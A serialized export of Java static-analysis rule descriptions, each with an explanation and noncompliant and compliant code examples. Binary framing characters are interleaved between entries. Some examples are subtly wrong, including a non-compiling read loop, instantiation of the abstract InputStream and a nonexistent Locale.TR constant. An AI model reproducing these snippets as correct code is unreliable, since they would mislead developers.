</pre>Z
CODE_SMELL
±

java:S2786¢
javaS2786,Nested "enum"s should not be declared static"MINOR*java:À<p>According to <a href="http://docs.oracle.com/javase/specs/jls/se7/html/jls-8.html#jls-8.9">the docs</a>:</p>
<blockquote>
  Nested enum types are implicitly
  <code>static</code>.
</blockquote>
<p>So there's no need to declare them <code>static</code> explicitly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Flower {
  static enum Color { // Noncompliant; static is redundant here
    RED, YELLOW, BLUE, ORANGE
  }

  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Flower {
  enum Color { // Compliant
    RED, YELLOW, BLUE, ORANGE
  }

  // ...
}
</pre>Z
CODE_SMELL
Ω

java:S1698Æ
javaS1698<"==" and "!=" should not be used when "equals" is overridden"MINOR*java:«<p>It is equivalent to use the equality <code>==</code> operator and the <code>equals</code> method to compare two objects if the <code>equals</code>
method inherited from <code>Object</code> has not been overridden. In this case both checks compare the object references.</p>
<p>But as soon as <code>equals</code> is overridden, two objects not having the same reference but having the same value can be equal. This rule spots
suspicious uses of <code>==</code> and <code>!=</code> operators on objects whose <code>equals</code> methods are overridden.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String firstName = getFirstName(); // String overrides equals
String lastName = getLastName();

if (firstName == lastName) { ... }; // Non-compliant; false even if the strings have the same value
</pre>
<h2>Compliant Solution</h2>
<pre>
String firstName = getFirstName();
String lastName = getLastName();

if (firstName != null &amp;&amp; firstName.equals(lastName)) { ... };
</pre>
<h2>Exceptions</h2>
<p>Comparing two instances of the <code>Class</code> object will not raise an issue:</p>
<pre>
Class c;
if(c == Integer.class) { // No issue raised
}
</pre>
<p>Comparing <code>Enum</code> will not raise an issue:</p>
<pre>
public enum Fruit {
   APPLE, BANANA, GRAPE
}
public boolean isFruitGrape(Fruit candidateFruit) {
  return candidateFruit == Fruit.GRAPE; // it's recommended to activate S4551 to enforce comparison of Enums using ==
}
</pre>
<p>Comparing with <code>final</code> reference will not raise an issue:</p>
<pre>
private static final Type DEFAULT = new Type();

void foo(Type other) {
  if (other == DEFAULT) { // Compliant
  //...
  }
}
</pre>
<p>Comparing with <code>this</code> will not raise an issue:</p>
<pre>
  public boolean equals(Object other) {
    if (this == other) {  // Compliant
      return false;
    }
 }
</pre>
<p>Comparing with <code>java.lang.String</code> and boxed types <code>java.lang.Integer</code>, ... will not raise an issue. </p>
<h2>See</h2>
<ul>
  <li> <a href='/coding_rules#rule_key=squid%3AS4973'>S4973</a> - Strings and Boxed types should be compared using "equals()" </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/595.html">MITRE, CWE-595</a> - Comparison of Object References Instead of Object Contents </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/597.html">MITRE, CWE-597</a> - Use of Wrong Operator in String Comparison </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/wwD1AQ">CERT, EXP03-J.</a> - Do not use the equality operators when comparing values of
  boxed primitives </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/8AEqAQ">CERT, EXP50-J.</a> - Do not confuse abstract object equality with reference
  equality </li>
</ul>Z
CODE_SMELL
ô

java:S1213ä
javaS1213UThe members of an interface or class declaration should appear in a pre-defined order"MINOR*java:ä<p>According to the Java Code Conventions as defined by Oracle, the members of a class or interface declaration should appear in the following order
in the source files:</p>
<ul>
  <li> Class and instance variables </li>
  <li> Constructors </li>
  <li> Methods </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo{
   private int field = 0;
   public boolean isTrue() {...}
   public Foo() {...}                         // Noncompliant, constructor defined after methods
   public static final int OPEN = 4;  //Noncompliant, variable defined after constructors and methods
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo{
   public static final int OPEN = 4;
   private int field = 0;
   public Foo() {...}
   public boolean isTrue() {...}
}
</pre>Z
CODE_SMELL
¢

java:S1694ì
javaS1694@An abstract class should have both abstract and concrete methods"MINOR*java:®
<p>The purpose of an abstract class is to provide some heritable behaviors while also defining methods which must be implemented by sub-classes.</p>
<p>A class with no abstract methods that was made abstract purely to prevent instantiation should be converted to a concrete class (i.e. remove the
<code>abstract</code> keyword) with a private constructor.</p>
<p>A class with only abstract methods and no inheritable behavior should be converted to an interface.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public abstract class Animal {  // Noncompliant; should be an interface
  abstract void move();
  abstract void feed();
}

public abstract class Color {  // Noncompliant; should be concrete with a private constructor
  private int red = 0;
  private int green = 0;
  private int blue = 0;

  public int getRed() {
    return red;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface Animal {
  void move();
  void feed();
}

public class Color {
  private int red = 0;
  private int green = 0;
  private int blue = 0;

  private Color () {}

  public int getRed() {
    return red;
  }
}

public abstract class Lamp {

  private boolean switchLamp=false;

  public abstract void glow();

  public void flipSwitch() {
    switchLamp = !switchLamp;
    if (switchLamp) {
      glow();
    }
  }
}
</pre>Z
CODE_SMELL
∫


java:S1210´

javaS1210R"equals(Object obj)" should be overridden along with the "compareTo(T obj)" method"MINOR*java:Æ	<p>According to the Java <code>Comparable.compareTo(T o)</code> documentation:</p>
<blockquote>
  <p>It is strongly recommended, but not strictly required that <code>(x.compareTo(y)==0) == (x.equals(y))</code>.</p>
  <p>Generally speaking, any class that implements the Comparable interface and violates this condition should clearly indicate this fact.</p>
  <p>The recommended language is "Note: this class has a natural ordering that is inconsistent with equals." </p>
</blockquote>
<p>If this rule is violated, weird and unpredictable failures can occur.</p>
<p>For example, in Java 5 the <code>PriorityQueue.remove()</code> method relied on <code>compareTo()</code>, but since Java 6 it has relied on
<code>equals()</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo implements Comparable&lt;Foo&gt; {
  @Override
  public int compareTo(Foo foo) { /* ... */ }      // Noncompliant as the equals(Object obj) method is not overridden
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo implements Comparable&lt;Foo&gt; {
  @Override
  public int compareTo(Foo foo) { /* ... */ }      // Compliant

  @Override
  public boolean equals(Object obj) { /* ... */ }
}
</pre>Z
CODE_SMELL
€

java:S1450Ã
javaS1450TPrivate fields only used as local variables in methods should become local variables"MINOR*java:Õ<p>When the value of a private field is always assigned to in a class' methods before being read, then it is not being used to store class
information. Therefore, it should become a local variable in the relevant methods to prevent any misunderstanding.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo {
  private int a;
  private int b;

  public void doSomething(int y) {
    a = y + 5;
    ...
    if(a == 0) {
      ...
    }
    ...
  }

  public void doSomethingElse(int y) {
    b = y + 3;
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo {

  public void doSomething(int y) {
    int a = y + 5;
    ...
    if(a == 0) {
      ...
    }
  }

  public void doSomethingElse(int y) {
    int b = y + 3;
    ...
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise any issue on annotated field.</p>Z
CODE_SMELL
˙

java:S2309Î
javaS2309Files should not be empty"MINOR*java:ß<p>Files with no lines of code clutter a project and should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
//package org.foo;
//
//public class Bar {}
</pre>Z
CODE_SMELL
º	

java:S3878≠	
javaS38783Arrays should not be created for varargs parameters"MINOR*java:œ<p>There's no point in creating an array solely for the purpose of passing it as a varargs (<code>...</code>) argument; varargs <em>is</em> an array.
Simply pass the elements directly. They will be consolidated into an array automatically. Incidentally passing an array where <code>Object ...</code>
is expected makes the intent ambiguous: Is the array supposed to be one object or a collection of objects?</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void callTheThing() {
  //...
  doTheThing(new String[] { "s1", "s2"});  // Noncompliant: unnecessary
  doTheThing(new String[12]);  // Compliant
  doTheOtherThing(new String[8]);  // Noncompliant: ambiguous
  // ...
}

public void doTheThing (String ... args) {
  // ...
}

public void doTheOtherThing(Object ... args) {
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void callTheThing() {
  //...
  doTheThing("s1", "s2");
  doTheThing(new String[12]);
  doTheOtherThing((Object[]) new String[8]);
   // ...
}

public void doTheThing (String ... args) {
  // ...
}

public void doTheOtherThing(Object ... args) {
  // ...
}
</pre>Z
CODE_SMELL
‡

java:S1104—
javaS1104:Class variable fields should not have public accessibility"MINOR*java:È
<p>Public class variable fields do not respect the encapsulation principle and has three main disadvantages:</p>
<ul>
  <li> Additional behavior such as validation cannot be added. </li>
  <li> The internal representation is exposed, and cannot be changed afterwards. </li>
  <li> Member values are subject to change from anywhere in the code and may not meet the programmer's assumptions. </li>
</ul>
<p>By using private attributes and accessor methods (set and get), unauthorized modifications are prevented.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  public static final int SOME_CONSTANT = 0;     // Compliant - constants are not checked

  public String firstName;                       // Noncompliant

}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {

  public static final int SOME_CONSTANT = 0;     // Compliant - constants are not checked

  private String firstName;                      // Compliant

  public String getFirstName() {
    return firstName;
  }

  public void setFirstName(String firstName) {
    this.firstName = firstName;
  }

}
</pre>
<h2>Exceptions</h2>
<p>Because they are not modifiable, this rule ignores <code>public final</code> fields.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/493.html">MITRE, CWE-493</a> - Critical Public Variable Without Final Modifier </li>
</ul>ZVULNERABILITY
ç

java:S2676˛
javaS2676SNeither "Math.abs" nor negation should be used on numbers that could be "MIN_VALUE""MINOR*java:á<p>It is possible for a call to <code>hashCode</code> to return <code>Integer.MIN_VALUE</code>. Take the absolute value of such a hashcode and you'll
still have a negative number. Since your code is likely to assume that it's a positive value instead, your results will be unreliable.</p>
<p>Similarly, <code>Integer.MIN_VALUE</code> could be returned from <code>Random.nextInt()</code> or any object's <code>compareTo</code> method, and
<code>Long.MIN_VALUE</code> could be returned from <code>Random.nextLong()</code>. Calling <code>Math.abs</code> on values returned from these methods
is similarly ill-advised.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(String str) {
  if (Math.abs(str.hashCode()) &gt; 0) { // Noncompliant
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(String str) {
  if (str.hashCode() != 0) {
    // ...
  }
}
</pre>ZBUG
’

java:S2674∆
javaS26747The value returned from a stream read should be checked"MINOR*java:Î<p>You cannot assume that any given stream reading call will fill the <code>byte[]</code> passed in to the method. Instead, you must check the value
returned by the read method to see how many bytes were read. Fail to do so, and you introduce bug that is both harmful and difficult to reproduce.</p>
<p>Similarly, you cannot assume that <code>InputStream.skip</code> will actually skip the requested number of bytes, but must check the value returned
from the method.</p>
<p>This rule raises an issue when an <code>InputStream.read</code> method that accepts a <code>byte[]</code> is called, but the return value is not
checked, and when the return value of <code>InputStream.skip</code> is not checked. The rule also applies to <code>InputStream</code> child
classes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(String fileName) {
  try {
    InputStream is = new InputStream(file);
    byte [] buffer = new byte[1000];
    is.read(buffer);  // Noncompliant
    // ...
  } catch (IOException e) { ... }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(String fileName) {
  try {
    InputStream is = new InputStream(file);
    byte [] buffer = new byte[1000];
    int count = 0;
    while (count = is.read(buffer) &gt; 0) {
      // ...
    }
  } catch (IOException e) { ... }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/XACSAQ">CERT, FIO10-J.</a> - Ensure the array is filled when using read() to fill an
  array </li>
</ul>ZBUG
∑

java:S3400®
javaS3400#Methods should not return constants"MINOR*java:⁄<p>There's no point in forcing the overhead of a method call for a method that always returns the same constant value. Even worse, the fact that a
method call must be made will likely mislead developers who call the method thinking that something more is done. Declare a constant instead. </p>
<p>This rule raises an issue if on methods that contain only one statement: the <code>return</code> of a constant value. </p>
<h2>Noncompliant Code Example</h2>
<pre>
int getBestNumber() {
  return 12;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
static int bestNumber = 12;
</pre>
<h2>Exceptions</h2>
<p>Methods with annotations, such as <code>@Override</code> and Spring's <code>@RequestMapping</code>, are ignored.</p>Z
CODE_SMELL
ú

java:S1220ç
javaS1220.The default unnamed package should not be used"MINOR*java:¥<p>According to the Java Language Specification:</p>
<blockquote>
  <p>Unnamed packages are provided by the Java platform principally for convenience when developing small or temporary applications or when just
  beginning development.</p>
</blockquote>
<p>To enforce this best practice, classes located in default package can no longer be accessed from named ones since Java 1.4.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass { /* ... */ }
</pre>
<h2>Compliant Solution</h2>
<pre>
package org.example;

public class MyClass{ /* ... */ }
</pre>Z
CODE_SMELL
Ì

java:S1109ﬁ
javaS1109@A close curly brace should be located at the beginning of a line"MINOR*java:Û<p>Shared coding conventions make it possible for a team to efficiently collaborate. This rule makes it mandatory to place a close curly brace at the
beginning of a line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(condition) {
  doSomething();}
</pre>
<h2>Compliant Solution</h2>
<pre>
if(condition) {
  doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>When blocks are inlined (open and close curly braces on the same line), no issue is triggered. </p>
<pre>
if(condition) {doSomething();}
</pre>Z
CODE_SMELL
›

java:S1108Œ
javaS1108fClose curly brace and the next "else", "catch" and "finally" keywords should be on two different lines"MINOR*java:Ω<p>Shared coding conventions make it possible for a team to collaborate efficiently.</p>
<p>This rule makes it mandatory to place a closing curly brace and the next <code>else</code>, <code>catch</code> or <code>finally</code> keyword on
two different lines.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void myMethod() {
  if(something) {
    executeTask();
  } else if (somethingElse) {          // Noncompliant
    doSomethingElse();
  }
  else {                               // Compliant
     generateError();
  }

  try {
    generateOrder();
  } catch (Exception e) {
    log(e);
  }
  finally {
    closeConnection();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void myMethod() {
  if(something) {
    executeTask();
  }
  else if (somethingElse) {
    doSomethingElse();
  }
  else {
     generateError();
  }

  try {
    generateOrder();
  }
  catch (Exception e) {
    log(e);
  }
  finally {
    closeConnection();
  }
}
</pre>Z
CODE_SMELL
”

java:S1228ƒ
javaS12287Packages should have a javadoc file 'package-info.java'"MINOR*java:‚<p>Each package in a Java project should include a <code>package-info.java</code> file. The purpose of this file is to document the Java package using
javadoc and declare package annotations.</p>
<h2>Compliant Solution</h2>
<pre>
/**
* This package has non null parameters and is documented.
**/
@ParametersAreNonnullByDefault
package org.foo.bar;
</pre>Z
CODE_SMELL
Â

java:S1107÷
javaS1107hClose curly brace and the next "else", "catch" and "finally" keywords should be located on the same line"MINOR*java:√<p>Shared coding conventions make it possible for a team to collaborate efficiently.</p>
<p>This rule makes it mandatory to place closing curly braces on the same line as the next <code>else</code>, <code>catch</code> or
<code>finally</code> keywords.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void myMethod() {
  if(something) {
    executeTask();
  } else if (somethingElse) {
    doSomethingElse();
  }
  else {                               // Noncompliant
     generateError();
  }

  try {
    generateOrder();
  } catch (Exception e) {
    log(e);
  }
  finally {                            // Noncompliant
    closeConnection();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void myMethod() {
  if(something) {
    executeTask();
  } else if (somethingElse) {
    doSomethingElse();
  } else {
     generateError();
  }

  try {
    generateOrder();
  } catch (Exception e) {
    log(e);
  } finally {
    closeConnection();
  }
}
</pre>Z
CODE_SMELL
ˆ

java:S1106Á
javaS1106@An open curly brace should be located at the beginning of a line"MINOR*java:¸<p>Shared coding conventions make it possible to collaborate efficiently. This rule makes it mandatory to place the open curly brace at the beginning
of a line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void myMethod {  // Noncompliant
  if(something) {  // Noncompliant
    executeTask();
  } else {  // Noncompliant
    doSomethingElse();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void myMethod
{
  if(something)
  {
    executeTask();
  } else
  {
    doSomethingElse();
  }
}
</pre>Z
CODE_SMELL
·

java:S1105“
javaS1105:An open curly brace should be located at the end of a line"MINOR*java:Ì<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when an open curly brace is not placed at the end of a
line of code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(condition)
{
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if(condition) {
  doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>When blocks are inlined (left and right curly braces on the same line), no issue is triggered. </p>
<pre>
if(condition) {doSomething();}
</pre>Z
CODE_SMELL
√

java:S1226¥
javaS1226`Method parameters, caught exceptions and foreach variables' initial values should not be ignored"MINOR*java:∞<p>While it is technically correct to assign to parameters from within method bodies, doing so before the parameter value is read is likely a bug.
Instead, initial values of parameters, caught exceptions, and foreach parameters should be, if not treated as <code>final</code>, then at least read
before reassignment.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doTheThing(String str, int i, List&lt;String&gt; strings) {
  str = Integer.toString(i); // Noncompliant

  for (String s : strings) {
    s = "hello world"; // Noncompliant
  }
}
</pre>ZBUG
π	

java:S1312™	
javaS1312MLoggers should be "private static final" and should share a naming convention"MINOR*java:≤<p>Regardless of the logging framework in use (logback, log4j, commons-logging, java.util.logging, ...), loggers should be:</p>
<ul>
  <li> <code>private</code>: never be accessible outside of its parent class. If another class needs to log something, it should instantiate its own
  logger. </li>
  <li> <code>static</code>: not be dependent on an instance of a class (an object). When logging something, contextual information can of course be
  provided in the messages but the logger should be created at class level to prevent creating a logger along with each object. </li>
  <li> <code>final</code>: be created once and only once per class. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With a default regular expression of <code>LOG(?:GER)?</code>:</p>
<pre>
public Logger logger = LoggerFactory.getLogger(Foo.class);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
private static final Logger LOGGER = LoggerFactory.getLogger(Foo.class);
</pre>
<h2>Exceptions</h2>
<p>Variables of type <code>org.apache.maven.plugin.logging.Log</code> are ignored.</p>Z
CODE_SMELL
Ù

java:S1310Â
javaS1310*Track uses of "NOPMD" suppression comments"MINOR*java:ê<p>This rule allows you to track the use of the PMD suppression comment mechanism. </p>
<h2>Noncompliant Code Example</h2>
<pre>
// NOPMD
</pre>Z
CODE_SMELL
ı


java:S1319Ê

javaS1319ÇDeclarations should use Java collection interfaces such as "List" rather than specific implementation classes such as "LinkedList""MINOR*java:∏	<p>The purpose of the Java Collections API is to provide a well defined hierarchy of interfaces in order to hide implementation details.</p>
<p>Implementing classes must be used to instantiate new collections, but the result of an instantiation should ideally be stored in a variable whose
type is a Java Collection interface.</p>
<p>This rule raises an issue when an implementation class:</p>
<ul>
  <li> is returned from a <code>public</code> method. </li>
  <li> is accepted as an argument to a <code>public</code> method. </li>
  <li> is exposed as a <code>public</code> member. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Employees {
  private HashSet&lt;Employee&gt; employees = new HashSet&lt;Employee&gt;();  // Noncompliant - "employees" should have type "Set" rather than "HashSet"

  public HashSet&lt;Employee&gt; getEmployees() {                       // Noncompliant
    return employees;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Employees {
  private Set&lt;Employee&gt; employees = new HashSet&lt;Employee&gt;();      // Compliant

  public Set&lt;Employee&gt; getEmployees() {                           // Compliant
    return employees;
  }
}
</pre>Z
CODE_SMELL
ç

java:S1315˛
javaS13153Track uses of "CHECKSTYLE:OFF" suppression comments"MINOR*java:†<p>This rule allows you to track the use of the Checkstyle suppression comment mechanism. </p>
<h2>Noncompliant Code Example</h2>
<pre>
// CHECKSTYLE:OFF
</pre>Z
CODE_SMELL
†

java:S1444ë
javaS1444)"public static" fields should be constant"MINOR*java:∫<p>There is no good reason to declare a field "public" and "static" without also declaring it "final". Most of the time this is a kludge to share a
state among several objects. But with this approach, any object can do whatever it wants with the shared state, such as setting it to
<code>null</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Greeter {
  public static Foo foo = new Foo();
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Greeter {
  public static final Foo FOO = new Foo();
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/500.html">MITRE, CWE-500</a> - Public Static Field Not Marked Final </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/QQBqAQ">CERT OBJ10-J.</a> - Do not use public static nonfinal fields </li>
</ul>ZVULNERABILITY
Ñ	

java:S4838ı
javaS4838VAn iteration on a Collection should be performed on the type handled by the Collection"MINOR*java:Ù<p>This rule raises an issue when an iteration over the items of a <code>Collection</code> is performed on a super-type of the type handled by the
<code>Collection</code>.</p>
<p>Relying on <code>Object</code> or any classes between <code>Object</code> and the real class handled by the <code>Collection</code> is not
recommended. While it's accepted by the language, this practice reduces readability of the code and forces to down-cast the item of the
<code>Collection</code> to be able to call a method on it while simply using the correct type in the iteration makes things more clear and simple.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public Collection&lt;Person&gt; getPersons() { ... }

for (Object item : getPersons()) { // Noncompliant
  Person person = (Person) item; // Noncompliant; it's required to down-cast to the to correct type to use "item"
  person.getAdress();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (Person person : getPersons()) { // Compliant
  person.getAddress() ;
}
</pre>Z
CODE_SMELL
 	

java:S4719ª	
javaS47190"StandardCharsets" constants should be preferred"MINOR*java:‡<p>JDK7 introduced the class <code>java.nio.charset.StandardCharsets</code>. It provides constants for all charsets that are guaranteed to be
available on every implementation of the Java platform.</p>
<ul>
  <li> ISO_8859_1 </li>
  <li> US_ASCII </li>
  <li> UTF_16 </li>
  <li> UTF_16BE </li>
  <li> UTF_16LE </li>
  <li> UTF_8 </li>
</ul>
<p>These constants should be preferred to:</p>
<p>- the use of a String such as "UTF-8" which has the drawback of requiring the <code>catch</code>/<code>throw</code> of an
<code>UnsupportedEncodingException</code> that will never actually happen</p>
<p>- the use of Guava‚Äôs <code>Charsets</code> class, which has been obsolete since JDK7</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  byte[] bytes = string.getBytes("UTF-8"); // Noncompliant; use a String instead of StandardCharsets.UTF_8
} catch (UnsupportedEncodingException e) {
  throw new AssertionError(e);
}
// ...
byte[] bytes = string.getBytes(Charsets.UTF_8); // Noncompliant; Guava way obsolete since JDK7
</pre>
<h2>Compliant Solution</h2>
<pre>
byte[] bytes = string.getBytes(StandardCharsets.UTF_8)
</pre>Z
CODE_SMELL
ò


java:S1449â

javaS1449*Locale should be used in String operations"MINOR*java:¥	<p>Failure to specify a locale when calling the methods <code>toLowerCase()</code>, <code>toUpperCase()</code> or <code>format()</code> on
<code>String</code> objects means the system default encoding will be used, possibly creating problems with international characters or number
representations. For instance with the Turkish language, when converting the small letter 'i' to upper case, the result is capital letter 'I' with a
dot over it.</p>
<p>Case conversion without a locale may work fine in its "home" environment, but break in ways that are extremely difficult to diagnose for customers
who use different encodings. Such bugs can be nearly, if not completely, impossible to reproduce when it's time to fix them. For locale-sensitive
strings, the correct locale should always be used, but <code>Locale.ENGLISH</code> can be used for case-insensitive ones.</p>
<h2>Noncompliant Code Example</h2>
<pre>
myString.toLowerCase()
</pre>
<h2>Compliant Solution</h2>
<pre>
myString.toLowerCase(Locale.TR)
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/EwAiAg">CERT, STR02-J.</a> - Specify an appropriate locale when comparing
  locale-dependent data </li>
</ul>Z
CODE_SMELL
»

java:S3626π
javaS3626'Jump statements should not be redundant"MINOR*java:Á<p>Jump statements such as <code>return</code> and <code>continue</code> let you change the default flow of program execution, but jump statements
that direct the control flow to the original direction are just a waste of keystrokes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void foo() {
  while (condition1) {
    if (condition2) {
      continue; // Noncompliant
    } else {
      doTheThing();
    }
  }
  return; // Noncompliant; this is a void method
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void foo() {
  while (condition1) {
    if (!condition2) {
      doTheThing();
    }
  }
}
</pre>Z
CODE_SMELL
…

java:S1206∫
javaS1206C"equals(Object obj)" and "hashCode()" should be overridden in pairs"MINOR*java:”<p>According to the Java Language Specification, there is a contract between <code>equals(Object)</code> and <code>hashCode()</code>:</p>
<blockquote>
  <p>If two objects are equal according to the <code>equals(Object)</code> method, then calling the <code>hashCode</code> method on each of the two
  objects must produce the same integer result. </p>
  <p>It is not required that if two objects are unequal according to the <code>equals(java.lang.Object)</code> method, then calling the
  <code>hashCode</code> method on each of the two objects must produce distinct integer results.</p>
  <p>However, the programmer should be aware that producing distinct integer results for unequal objects may improve the performance of
  hashtables.</p>
</blockquote>
<p>In order to comply with this contract, those methods should be either both inherited, or both overridden.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {    // Noncompliant - should also override "hashCode()"

  @Override
  public boolean equals(Object obj) {
    /* ... */
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {    // Compliant

  @Override
  public boolean equals(Object obj) {
    /* ... */
  }

  @Override
  public int hashCode() {
    /* ... */
  }

}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/581.html">MITRE, CWE-581</a> - Object Model Violation: Just One of Equals and Hashcode Defined
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/EYYbAQ">CERT, MET09-J.</a> - Classes that define an equals() method must also define a
  hashCode() method </li>
</ul>ZBUG
µ

java:S1940¶
javaS1940%Boolean checks should not be inverted"MINOR*java:÷<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ( !(a == 2)) { ...}  // Noncompliant
boolean b = !(i &lt; 10);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a != 2) { ...}
boolean b = (i &gt;= 10);
</pre>Z
CODE_SMELL
∞

java:S4087°
javaS4087'"close()" calls should not be redundant"MINOR*java:œ<p>Java 7's try-with-resources structure automatically handles closing the resources that the <code>try</code> itself opens. Thus, adding an explicit
<code>close()</code> call is redundant and potentially confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try (PrintWriter writer = new PrintWriter(process.getOutputStream())) {
  String contents = file.contents();
  writer.write(new Gson().toJson(new MyObject(contents)));
  writer.flush();
  writer.close();  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try (PrintWriter writer = new PrintWriter(process.getOutputStream())) {
  String contents = file.contents();
  writer.write(new Gson().toJson(new MyObject(contents)));
  writer.flush();
}
</pre>Z
CODE_SMELL
«

java:S2912∏
javaS2912,"indexOf" checks should use a start position"MINOR*java:·<p>One thing that makes good code good is the clarity with which it conveys the intent of the original programmer to maintainers, and the proper
choice of <code>indexOf</code> methods can help move code from confusing to clear.</p>
<p>If you need to see whether a substring is located beyond a certain point in a string, you can test the <code>indexOf</code> the substring versus
the target point, or you can use the version of <code>indexOf</code> which takes a starting point argument. The latter is arguably clearer because the
result is tested against -1, which is an easily recognizable "not found" indicator.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String name = "ismael";

if (name.indexOf("ae") &gt; 2) { // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
String name = "ismael";

if (name.indexOf("ae", 2) &gt; -1) {
  // ...
}
</pre>Z
CODE_SMELL
“

java:S1943√
javaS1943OClasses and methods that rely on the default system encoding should not be used"MINOR*java:…<p>Using classes and methods that rely on the default system encoding can result in code that works fine in its "home" environment. But that code may
break for customers who use different encodings in ways that are extremely difficult to diagnose and nearly, if not completely, impossible to
reproduce when it's time to fix them.</p>
<p>This rule detects uses of the following classes and methods:</p>
<ul>
  <li> <code>FileReader</code> </li>
  <li> <code>FileWriter</code> </li>
  <li> String constructors with a <code>byte[]</code> argument but no <code>Charset</code> argument
    <ul>
      <li> <code>String(byte[] bytes)</code> </li>
      <li> <code>String(byte[] bytes, int offset, int length)</code> </li>
    </ul> </li>
  <li> <code>String.getBytes()</code> </li>
  <li> <code>String.getBytes(int srcBegin, int srcEnd, byte[] dst, int dstBegin)</code> </li>
  <li> <code>InputStreamReader(InputStream in)</code> </li>
  <li> <code>OutputStreamWriter(OutputStream out)</code> </li>
  <li> <code>ByteArrayOutputStream.toString()</code> </li>
  <li> Some <code>Formatter</code> constructors
    <ul>
      <li> <code>Formatter(String fileName)</code> </li>
      <li> <code>Formatter(File file)</code> </li>
      <li> <code>Formatter(OutputStream os)</code> </li>
    </ul> </li>
  <li> Some <code>Scanner</code> constructors
    <ul>
      <li> <code>Scanner(File source)</code> </li>
      <li> <code>Scanner(Path source)</code> </li>
      <li> <code>Scanner(InputStream source)</code> </li>
    </ul> </li>
  <li> Some <code>PrintStream</code> constructors
    <ul>
      <li> <code>PrintStream(File file)</code> </li>
      <li> <code>PrintStream(OutputStream out)</code> </li>
      <li> <code>PrintStream(OutputStream out, boolean autoFlush)</code> </li>
      <li> <code>PrintStream(String fileName)</code> </li>
    </ul> </li>
  <li> Some <code>PrintWriter</code> constructors
    <ul>
      <li> <code>PrintWriter(File file)</code> </li>
      <li> <code>PrintWriter(OutputStream out)</code> </li>
      <li> <code>PrintWriter(OutputStream out, boolean autoFlush)</code> </li>
      <li> <code>PrintWriter(String fileName)</code> </li>
    </ul> </li>
  <li> methods from Apache commons-io library which accept an encoding argument when that argument is null, and overloads of those methods that omit
  the encoding argument
    <ul>
      <li> <code>IOUtils.copy(InputStream, Writer)</code> </li>
      <li> <code>IOUtils.copy(Reader, OutputStream)</code> </li>
      <li> <code>IOUtils.readLines(InputStream)</code> </li>
      <li> <code>IOUtils.toByteArray(Reader)</code> </li>
      <li> <code>IOUtils.toByteArray(String)</code> </li>
